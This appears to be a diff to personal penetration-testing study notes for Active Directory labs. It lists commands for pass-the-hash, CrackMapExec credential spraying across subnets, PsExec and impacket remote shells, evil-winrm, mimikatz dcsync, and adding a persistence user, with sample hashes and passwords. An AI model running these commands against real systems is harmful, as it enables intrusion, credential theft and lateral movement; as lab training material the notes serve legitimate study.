@@ -14,7 +14,10 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
 - Command execution(e.g. wget,ipconfig, whoami/groups): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Invoke-WebRequest -Uri "http://192.168.1.223:8000/users.txt"'`
 - create new user for persistence(in case ippsec change pw): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net user /add admin Password12345'`
 - add user to localgroup: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net local group administrators'`
-- 
+- attempt to authenticate each machine in the subnet with the username and hash provided: `crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local`
+- NOTE: #--local: This flag specifies that you're attempting to authenticate against local accounts on the target machine, rather than domain accounts.
+
+
 ## Tool 2:LdapDomainDump
 - Download: `git clone https://github.com/dirkjanm/ldapdomaindump`
 - got ldap dump: `python3 ldapdomaindump.py --user DOMAIN\\username -p Password12345 ldap://x.x.x.x:389 --no-json --no-grep -o data`
@@ -332,6 +335,18 @@ python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
 ./mimikatz.exe "lsadump::dcsync /user:Administrator"
 ```
 
+# Lateral movement - try to use PsExec instead of CME as the remote shell will be more persistent
+## Tool 1: PsExec (The tool for RCE, provide remote execution of processes on other systems through an interactive console.
+
+Precondition:
+- First, the user that authenticates to the target machine needs to be part of the Administrators local group - usually default
+- Second, the ADMIN$ share must be available - usually default
+- third, File and Printer Sharing has to be turned on. 
+
+```bash
+./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
+```
+
 ## PASS THE Password and see what other accounts can the password access
 
          crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
@@ -344,15 +359,34 @@ psexec.py marvel/fcastle:Password1@192.168.57.142
         
 ## Pass the Hash (Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached)
 - Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
+Precondition (3 conditions):
+- requires an SMB connection through the firewall (commonly port 445)
+- the Windows File and Printer Sharing feature to be enabled.
+- admin share called ADMIN$ to be available.
+
+- using wmiexec on kali
+  
+         kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+  
+- Remote Access + evil-winrm  
+
+         evil-winrm -i <IP> -u <user> -H <hash>
+  
+- Remote Access - impacket-psexec  
 ```
-crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local  
-pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd.exe
+impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
+psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b 
 ```
 
-- Exploitation to run commands as another user using PTH:
+- Remote Access - CrackMapExec (to run commands as another user using PTH)
 ```
 crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'
 crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'
+```
+
+```
+
+pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd.exe
 ```
 
 - find which account can the hash access 
@@ -360,20 +394,12 @@ crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'wh
 crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local
 ```
 
-- Remote Access - impacket-psexec  
-```
-impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
-psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b 
-```
-
-- Remote Access + evil-winrm  
-
-         evil-winrm -i <IP> -u <user> -H <hash>
 
 
-- using wmiexec on kali
-  
-         kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
+
+
+
+
 
 
 ## Over Pass the Hash
